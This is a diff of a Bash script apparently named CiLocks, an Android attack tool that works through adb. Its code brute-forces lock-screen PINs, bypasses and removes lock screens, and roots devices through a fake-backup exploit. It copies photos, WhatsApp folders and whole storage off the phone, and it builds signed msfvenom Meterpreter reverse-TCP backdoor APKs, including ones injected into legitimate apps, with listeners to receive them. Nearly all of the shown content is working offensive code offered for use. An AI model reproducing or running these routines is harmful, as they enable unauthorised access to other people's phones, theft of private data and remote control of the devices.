@@ -1,11 +1,4 @@
 #!/usr/bin/env bash
-# Refrence
-# adb shell input keyevent 26 && adb shell input keyevent 82 && adb shell input text 1337 && adb shell input keyevent 66
-# https://stackoverflow.com/questions/29072501/how-to-unlock-android-phone-through-adb
-# http://www.hak5.org/episodes/hak5-1205
-# https://github.com/kosborn/p2p-adb
-# https://forum.xda-developers.com/t/universal-guide-root-any-android-device-manually.2684210/
-# https://stackoverflow.com/questions/14685721/how-can-i-do-factory-reset-using-adb-in-android
 m="\e[0;31m" # merah
 k="\e[0;33m" # kuning
 h="\e[0;32m" # hijau
@@ -17,6 +10,16 @@ lb="\e[1;34m" # langit biru
 n="\e[0m" # netral
 w="\e[1;37m" # putih tebal
 clear
+[[ `id -u` -eq 0 ]] > /dev/null 2>&1 || { echo  ${m} "You must be root to run the script${n}"; echo ; exit 1; }
+path=$(pwd)
+name='cilocks'
+function files() {
+  file=$path/$name
+  bash $file
+}
+clear
+function banner() {
+
 echo -e "${lb}
    _______ __               __
   / ____(_) /   ____  _____/ /_______
@@ -26,18 +29,26 @@ echo -e "${lb}
 ${n}"
 echo -e "${m}   Crack Interface LockScreen${n}"
 echo -e "${lb}      LoliC0d3 - Tegal1337${n}"
+}
+banner
 echo -e "${lh}
-1.Brute Pin 4 Digit
-2.Brute Pin 6 Digit
-3.Brute LockScreen Using Wordlist
-4.Bypass LockScreen {Antiguard} Not Support All OS Version
-5.Root Android {Supersu} Not Support All OS Version
-6.Still File
-7.Reset Data
+1.Update
+2.Brute Pin 4 Digit
+3.Brute Pin 6 Digit
+4.Brute LockScreen Using Wordlist
+5.Bypass LockScreen {Antiguard} Not Support All OS Version
+6.Root Android {Supersu} Not Support All OS Version
+7.Jump To Adb Toolkit
+8.Reset Data
+9.Remove LockScreen {Root}
+10.Jump To Metasploit
+99.Exit
 ${n}"
 read -p "senpai@tegalsec:~# " select
 if [[ $select == 1 ]]; then
-  # adb shell input keyevent 26 #Pressing the lock button
+    bash config/devices
+elif [[ $select == 2 ]]; then
+  #adb shell input keyevent 26 #Pressing the lock button
   adb shell input keyevent 82
 
   echo "Brute Pin 4 Digit"
@@ -59,7 +70,7 @@ if [[ $select == 1 ]]; then
       fi
   done
 
-elif [[ $select == 2 ]]; then
+elif [[ $select == 3 ]]; then
   # adb shell input keyevent 26 #Pressing the lock button
   adb shell input keyevent 82
 
@@ -89,7 +100,7 @@ elif [[ $select == 2 ]]; then
       fi
   done
 
-elif [[ $select == 3 ]]; then
+elif [[ $select == 4 ]]; then
   # adb shell input keyevent 26 #Pressing the lock button
   adb shell input keyevent 82
   echo "Brute LockScreen Using Wordlist"
@@ -119,7 +130,7 @@ elif [[ $select == 3 ]]; then
       fi
   done
 
-elif [[ $select == 4 ]]; then
+elif [[ $select == 5 ]]; then
   adb shell pm list packages | grep io.kos.antiguard 2>/dev/null > /dev/null
 
 isInstalled=$?
@@ -132,7 +143,7 @@ else
 	adb shell am start io.kos.antiguard/.unlock
 fi
 
-elif [[ $select == 5 ]]; then
+elif [[ $select == 6 ]]; then
   adb restore modules/fakebackup.ab
 
 command "while ! ln -s /data/local.prop /data/data/com.android.settings/a/file99 2>/dev/null; do :; done; echo 'Overwrote local.prop!';"
@@ -152,34 +163,68 @@ if command "cat /data/local.prop"
 	adb reboot
 fi
 
-elif [[ $select == 6 ]]; then
-  echo -e "${lh}
-  1.Image Still
-  2.Manual Still
-  ${n}"
-  read -p "senpai@tegalsec:~# " select
-  if [[ $select == 1 ]]; then
-    dir=$(adb shell '[[ -d /sdcard/DCIM/Camera/  ]] && echo 1' | tr -d "\r")
-
-    if [ "$dir" = "1" ]; then
-    	path='/sdcard/DCIM/Camera'
-    	getSearch "$path" "*.jpg"
-    else
-    	echo "Camera directory doesn't exist?"
-    fi
-  elif [[ $select == 2 ]]; then
-    read -p "Enter Path File: " path
-      dir=$(adb shell '[[ -d '$path' ]] && echo 1' | tr -d "\r")
-
-      if [ "$dir" = "1" ]; then
-      	getSearch "$path" "/*"
-      else
-      	echo $path" directory doesn't exist?"
-      fi
-  else
-     echo -e  "${m} Your Brain Error!${n}"
-    fi
 elif [[ $select == 7 ]]; then
+  clear
+  function mmeta() {
+    banner
+    echo -e "${m}           Adb Toolkit${n}"
+  }
+  mmeta
+  echo -e "${lh}
+1.Shell
+2.ScreenShot
+3.Copy All Camera Photo
+4.Copy All WhatsApp Folder
+5.Copy All Data Storage
+6.Manual Copy {Costum}
+99.Menu
+${n}  "
+read -p "senpai@tegalsec:~# " select
+  if [[ $select == 1 ]]; then
+      echo "Opening Shell..."
+      sleep 3
+      adb shell
+    elif [[ $select == 2 ]]; then
+      export time=$(date +"%T")
+      path=Files/Screenshot
+      file=screenshoot-$time.png
+      paths=$path/$file
+      adb exec-out screencap -p > $file
+      sudo mv $file $paths
+      echo "Your File Saved In $paths "
+    elif [[ $select == 3 ]]; then
+      export time=$(date +"%T")
+      path=Files
+      dir=DCIM-$time
+      paths=$path/$dir
+      adb pull /sdcard/DCIM/ $path/$dir
+      echo "Your File Saved In $paths "
+    elif [[ $select == 4 ]]; then
+      export time=$(date +"%T")
+      path=Files
+      dir=WhatsApp-$time
+      paths=$path/$dir
+      adb pull /sdcard/WhatsApp/ $paths
+      echo "Your File Saved In $paths "
+    elif [[ $select == 5 ]]; then
+      export time=$(date +"%T")
+      path=Files
+      dir=sdcard-$time
+      paths=$path/$dir
+      adb pull /sdcard/ $paths
+      echo "Your File Saved In $paths "
+    elif [[ $select == 6 ]]; then
+      echo "Ex: /sdcard/Document/"
+      read -p "Enter Path: " pathz
+      read -p "Enter Name Folder: " dir
+      path=Files
+      paths=$path/$dir
+      adb pull $pathz $paths
+      echo "Your File Saved In $paths "
+    elif [[ $select == 99 ]]; then
+    files
+    fi
+elif [[ $select == 8 ]]; then
   echo -e "${lh}
   1.Fastboot
   2.Recovery
@@ -207,7 +252,121 @@ elif [[ $select == 7 ]]; then
     echo -e  "${m} Your Brain Error!${n}"
   fi
 
+elif [[ $select == 9 ]]; then
+  rem=$(adb shell su -c rm /data/system/*.key | adb reboot )
+  echo $rem
+  echo "success"
 
+
+
+elif [[ $select == 10 ]]; then
+  clear
+  function mmeta() {
+    banner
+    echo -e "${m}   Metasploit Backdoor Generator${n}"
+  }
+  mmeta
+echo -e "${lh}
+1.Install Application
+2.Create Payload Backdoor {Msfvenom} Singed
+3.Run Metasploit
+4.Inject Payload In Original Application
+99.Menu
+${n}"
+read -p "senpai@tegalsec:~# " select
+if [[ $select == 1 ]]; then
+  read -p "Enter Ur Application: " app
+  read -p "Run Application {Y/N}: " run
+  if [ $run == "Y" ] || [ $run == "y" ]; then
+     read -p "Enter Package Application Name: " pkg
+     adb install $app
+     adb shell am start $pkg/.unlock
+  else
+    adb install $app
+  fi
+
+elif [[ $select == 2 ]]; then
+  path="backdoor"
+  loli="loli.apk"
+  read -p "Enter LHOST: " host
+  read -p "Enter LPORT: " port
+  read -p "Application Name: " app
+  paths=$path/$loli
+  echo -e "${lb}Wait Creating Backdoor...${n}"
+  msfvenom -p android/meterpreter/reverse_tcp lhost=$host lport=$port R> $paths
+  echo "Wait Installing Keystore..."
+  sleep 5
+  keytool -genkey -V -keystore $path/key.keystore -alias hacked -keyalg RSA -keysize 2048 -validity 10000
+  jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore $path/key.keystore $paths hacked
+  jarsigner -verify -verbose -certs $paths
+  zipalign -v 4 $paths $path'/'$app'.apk'
+  milf=$path/$app'.apk'
+  rm $paths
+  rm $path/key.keystore
+  echo "Your Backdoor Created In" $milf
+elif [[ $select == 3 ]]; then
+  clear
+  mmeta
+  payload='android/meterpreter/reverse_tcp'
+  echo -e "${m}
+Payload => $payload ${n}${lh}
+Listener
+1.exploit/multi/handler {Default}
+2.post/android/manage/remove_lock
+3.post/android/manage/remove_lock_root
+  ${n}"
+  read -p "senpai@tegalsec:~# " select
+  if [[ $select == 1 ]]; then
+    read -p "LHOST: " host
+    read -p "LPORT: " port
+    msfconsole=msfconsole
+    exploit='use exploit/multi/handler'
+    xterm -T " CiLocks Exploit " -geometry 100x35 -e "$msfconsole -x '$exploit; set PAYLOAD $payload ; set lhost $host ; set lport $port; exploit; exit -y'"
+
+  elif [[ $select == 2 ]]; then
+    read -p "LHOST: " host
+    read -p "LPORT: " port
+    msfconsole=msfconsole
+    exploit='use post/android/manage/remove_lock'
+    xterm -T " CiLocks Exploit " -geometry 100x35 -e "$msfconsole -x '$exploit; set PAYLOAD $payload ; set lhost $host ; set lport $port; exploit; exit -y'"
+
+  elif [[ $select == 3 ]]; then
+    read -p "LHOST: " host
+    read -p "LPORT: " port
+    msfconsole=msfconsole
+    exploit='use post/android/manage/remove_lock_root'
+    xterm -T " CiLocks Exploit " -geometry 100x35 -e "$msfconsole -x '$exploit; set PAYLOAD $payload ; set lhost $host ; set lport $port; exploit; exit -y'"
+
+  fi
+elif [[ $select == 4 ]]; then
+  path="backdoor"
+  loli="loli.apk"
+  read -p "Enter LHOST: " host
+  read -p "Enter LPORT: " port
+  read -p "Enter Original Application: " ori
+  read -p "Application Name: " app
+  paths=$path/$loli
+  echo -e "${lb}Wait Creating Backdoor...${n}"
+  msfvenom --platform android -x $ori -p android/meterpreter/reverse_tcp lhost=$host lport=$port -o $paths
+
+# if error,uncomment it
+
+# echo "Wait Installing Keystore..."
+  # sleep 5
+  # keytool -genkey -V -keystore $path/key.keystore -alias hacked -keyalg RSA -keysize 2048 -validity 10000
+  # jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore $path/key.keystore $paths hacked
+  # jarsigner -verify -verbose -certs $paths
+  # zipalign -v 4 $paths $path'/'$app'.apk'
+  # milf=$path/$app'.apk'
+  # rm $paths
+  # rm $path/key.keystore
+  echo "Your Backdoor Created In" $milf
+elif [[ $select == 99 ]]; then
+    files
+fi
+
+elif [[ $select == 99 ]]; then
+    echo "oke"
 
 else
   echo -e  "${m} Your Brain Error!${n}"
